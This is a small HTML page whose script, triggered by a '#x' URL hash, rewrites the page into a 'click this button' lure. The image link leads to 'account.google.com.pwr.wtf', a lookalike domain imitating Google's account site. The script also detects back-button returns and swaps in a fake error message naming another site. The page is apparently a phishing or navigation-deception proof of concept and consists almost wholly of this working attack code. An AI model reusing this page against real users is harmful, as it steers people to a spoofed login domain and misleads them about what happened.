<html lang="en">

<script>
if (location.hash === '#x') {

  function renderMain() {
    document.body.innerHTML = `
      <center>
        <br><h3>Click this button and return to the page</h3><br><br>
        <img width=400
             src="https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp"
             style="cursor:pointer"
             onclick="location='https://account.google.com.pwr.wtf/public_html/slaw.html'">
      </center>
    `;
  }

  function renderError() {
    document.body.innerHTML = `
      <center>
        <br><h3>error? go to www.fix.com</h3>
      </center>
    `;
  }

  renderMain();

  // Detect when user returns via back button
  window.addEventListener("pageshow", function(e) {
    if (performance.navigation.type === 2 || e.persisted) {
      renderError();
    }
  });
}
</script>
